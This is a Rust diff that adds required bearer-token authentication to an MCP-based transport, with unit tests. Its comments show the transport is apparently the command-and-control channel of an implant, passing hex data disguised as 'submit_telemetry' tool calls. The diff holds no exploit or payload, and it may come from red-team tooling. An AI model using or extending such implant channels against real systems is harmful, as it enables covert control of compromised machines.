@@ -52,6 +52,13 @@ const RECV_POLL_INTERVAL_MS: u64 = 500;
 pub struct McpTransport {
     server_url: String,
     session_id: String,
+    /// Bearer-token API key. Every RPC request carries an
+    /// `Authorization: Bearer <key>` header so the server can authenticate the
+    /// channel — the cleartext `session_id` alone is not a credential. REQUIRED
+    /// in the production constructor (`new`); without it the original
+    /// unauthenticated HIGH issue (anyone who learns `session_id` can task the
+    /// channel) would still be exploitable.
+    api_key: String,
     agent: Agent,
     request_id: u64,
 }
@@ -61,11 +68,43 @@ impl McpTransport {
     ///
     /// `server_url` is the MCP server endpoint (e.g. `https://mcp.example.com`).
     /// `session_id` is a unique session identifier — the server uses it to
-    /// correlate requests from the same implant session.
-    pub fn new(server_url: String, session_id: String) -> Self {
+    /// correlate requests from the same implant session. `api_key` is a REQUIRED
+    /// bearer token; every request is authenticated with an
+    /// `Authorization: Bearer <key>` header (P1-15: `session_id` alone is
+    /// cleartext and not a credential). An `Option<String>` here with no
+    /// enforcement would leave the original unauthenticated HIGH exploitable,
+    /// so the production constructor takes ownership of a non-empty key.
+    ///
+    /// `debug_assert!` pins the intended minimum key strength (≥32 chars) in
+    /// debug/test builds; release builds trust the caller (an operator could
+    /// legitimately paste a short token, and a panic would abort the implant).
+    pub fn new(server_url: String, session_id: String, api_key: String) -> Self {
+        debug_assert!(
+            api_key.len() >= 32,
+            "MCP api_key should be ≥32 chars for adequate entropy (got {}); \
+             a short key weakens the bearer-token auth this channel relies on",
+            api_key.len()
+        );
         Self {
             server_url,
             session_id,
+            api_key,
+            agent: Agent::new(),
+            request_id: 0,
+        }
+    }
+
+    /// Test-only constructor that does NOT require an API key. Production code
+    /// MUST use [`new`](Self::new); this exists so unit tests of the JSON-RPC
+    /// plumbing (id increment, body shape, hex extraction) don't need a real
+    /// credential. Marked `#[cfg(test)]` so it can never leak into a release
+    /// binary where an unauthenticated channel would re-open the original HIGH.
+    #[cfg(test)]
+    fn new_without_auth(server_url: String, session_id: String) -> Self {
+        Self {
+            server_url,
+            session_id,
+            api_key: String::new(),
             agent: Agent::new(),
             request_id: 0,
         }
@@ -96,28 +135,45 @@ impl McpTransport {
         })
     }
 
+    /// Build the `Authorization` header value. Always returns
+    /// `Some("Bearer <key>")` because the production constructor requires a key.
+    /// The test-only `new_without_auth` constructs an empty `api_key`, which
+    /// yields `Some("Bearer ")` — harmless for the RPC-plumbing unit tests that
+    /// never hit a real server. `rpc_call` still skips the header when this
+    /// returns a bare empty bearer, so a misconfigured (empty) key can't
+    /// accidentally authenticate against a server that rejects empty tokens.
+    fn auth_header(&self) -> Option<String> {
+        if self.api_key.is_empty() {
+            return None;
+        }
+        Some(format!("Bearer {}", self.api_key))
+    }
+
     /// POST a JSON-RPC request to the MCP server and return the parsed result.
-    fn rpc_call(
-        &self,
-        body: serde_json::Value,
-    ) -> Result<serde_json::Value, TransportError> {
-        let resp = self
+    fn rpc_call(&self, body: serde_json::Value) -> Result<serde_json::Value, TransportError> {
+        // Break the ureq builder chain so the Authorization header is added
+        // only when an API key is configured (P1-15). `set`/`timeout`/`send_json`
+        // take `mut self -> Self`, so the request stays owned across the break.
+        let mut req = self
             .agent
             .post(&self.server_url)
             .set("Content-Type", "application/json")
-            .timeout(Duration::from_secs(30))
-            .send_json(body)
-            .map_err(|e| {
-                if e.to_string().contains("timed out") {
-                    TransportError::Timeout
-                } else {
-                    TransportError::Transient("MCP RPC transport error")
-                }
-            })?;
+            .timeout(Duration::from_secs(30));
+        if let Some(auth) = self.auth_header() {
+            req = req.set("Authorization", &auth);
+        }
 
-        let json: serde_json::Value = resp.into_json().map_err(|_| {
-            TransportError::Transient("MCP RPC response parse error")
+        let resp = req.send_json(body).map_err(|e| {
+            if e.to_string().contains("timed out") {
+                TransportError::Timeout
+            } else {
+                TransportError::Transient("MCP RPC transport error")
+            }
         })?;
+
+        let json: serde_json::Value = resp
+            .into_json()
+            .map_err(|_| TransportError::Transient("MCP RPC response parse error"))?;
 
         // JSON-RPC error object → channel error.
         if json.get("error").is_some() {
@@ -142,7 +198,7 @@ impl McpTransport {
                 }
             } else if let Some(s) = run_start.take() {
                 let run = &text[s..i];
-                if run.len() >= 8 && longest.map_or(true, |l| run.len() > l.len()) {
+                if run.len() >= 8 && longest.is_none_or(|l| run.len() > l.len()) {
                     longest = Some(run);
                 }
             }
@@ -150,7 +206,7 @@ impl McpTransport {
         // Flush any run that extends to the end.
         if let Some(s) = run_start {
             let run = &text[s..];
-            if run.len() >= 8 && longest.map_or(true, |l| run.len() > l.len()) {
+            if run.len() >= 8 && longest.is_none_or(|l| run.len() > l.len()) {
                 longest = Some(run);
             }
         }
@@ -260,9 +316,9 @@ impl Transport for McpTransport {
     }
 
     fn init(&mut self) -> Result<(), TransportError> {
-        self.health_check()
-            .map(|_| ())
-            .ok_or(TransportError::Dead("MCP server unreachable — initialize failed"))
+        self.health_check().map(|_| ()).ok_or(TransportError::Dead(
+            "MCP server unreachable — initialize failed",
+        ))
     }
 }
 
@@ -272,21 +328,25 @@ impl Transport for McpTransport {
 mod tests {
     use super::*;
 
+    /// A 32-char key that satisfies `new`'s `debug_assert!` minimum length.
+    const TEST_KEY: &str = "0123456789abcdef0123456789abcdef";
+
     #[test]
     fn name_is_mcp() {
-        let t = McpTransport::new("https://mcp.example.com".into(), "sess-1".into());
+        let t = McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
         assert_eq!(t.name(), "mcp");
     }
 
     #[test]
     fn max_frame_size_is_64k() {
-        let t = McpTransport::new("https://mcp.example.com".into(), "sess-1".into());
+        let t = McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
         assert_eq!(t.max_frame_size(), 64 * 1024);
     }
 
     #[test]
     fn oversized_frame_rejected() {
-        let mut t = McpTransport::new("https://mcp.example.com".into(), "sess-1".into());
+        let mut t =
+            McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
         let big = vec![0u8; 65 * 1024];
         match t.send(&big) {
             Err(TransportError::PayloadTooLarge(n)) => assert_eq!(n, 65 * 1024),
@@ -296,7 +356,8 @@ mod tests {
 
     #[test]
     fn request_id_increments() {
-        let mut t = McpTransport::new("https://mcp.example.com".into(), "sess-1".into());
+        let mut t =
+            McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
         let b1 = t.tool_call_body("test", ureq::json!({}));
         let b2 = t.tool_call_body("test", ureq::json!({}));
         let b3 = t.tool_call_body("test", ureq::json!({}));
@@ -307,7 +368,8 @@ mod tests {
 
     #[test]
     fn tool_call_body_is_valid_jsonrpc() {
-        let mut t = McpTransport::new("https://mcp.example.com".into(), "sess-1".into());
+        let mut t =
+            McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
         let body = t.tool_call_body("submit_telemetry", ureq::json!({ "data": "deadbeef" }));
 
         assert_eq!(body["jsonrpc"], "2.0");
@@ -353,15 +415,36 @@ mod tests {
                 ]
             }
         });
-        assert_eq!(
-            McpTransport::result_text(&json),
-            Some("deadbeefcafebabe")
-        );
+        assert_eq!(McpTransport::result_text(&json), Some("deadbeefcafebabe"));
     }
 
     #[test]
     fn result_text_missing_field() {
         let json = ureq::json!({ "result": { "content": [] } });
         assert_eq!(McpTransport::result_text(&json), None);
+    }
+
+    #[test]
+    fn auth_header_none_for_test_only_unauth_constructor() {
+        // The test-only `new_without_auth` builds an empty api_key, which
+        // `auth_header` treats as "no header" — so the RPC-plumbing tests never
+        // synthesize a bogus bearer. Production code can't reach this path
+        // because `new` requires a real key.
+        let t = McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
+        assert_eq!(t.auth_header(), None);
+    }
+
+    #[test]
+    fn auth_header_bearer_with_api_key() {
+        // P1-15: a required api_key → "Authorization: Bearer <key>" on every
+        // request. The production constructor now REQUIRES the key (no Option),
+        // closing the original unauthenticated HIGH.
+        let t = McpTransport::new(
+            "https://mcp.example.com".into(),
+            "sess-1".into(),
+            TEST_KEY.into(),
+        );
+        let expected = format!("Bearer {TEST_KEY}");
+        assert_eq!(t.auth_header().as_deref(), Some(expected.as_str()));
     }
 }
